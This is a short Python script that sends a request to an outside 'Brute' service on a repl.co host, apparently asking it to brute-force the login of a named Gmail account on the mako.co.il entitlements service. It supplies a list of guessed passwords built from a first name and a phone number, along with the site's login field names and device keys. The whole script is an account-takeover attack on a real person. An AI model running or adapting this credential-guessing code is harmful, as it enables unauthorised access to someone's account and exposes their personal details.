import requests
import itertools

url = "https://mass.mako.co.il/ClicksStatistics/entitlementsServicesV2.jsp?et=nln"
data = {
  "url":url,
  "user":"qaroofx@gmail.com",
  "passwords":["ilay","0505506566","123","ilay0505506566"],
  "succesmsg":"Success",
  "usField":"eu",
  "passField":"dwp",
  "keys":"{'du': 'W42b2a4532b04a721c985f6094921a7725aa', 'da': '6gkr2ks9-4610-392g-f4s8-d743gg4623k2'}"
}
x = requests.post("https://Brute.selllit.repl.co/force", data=data)
print(x.text)



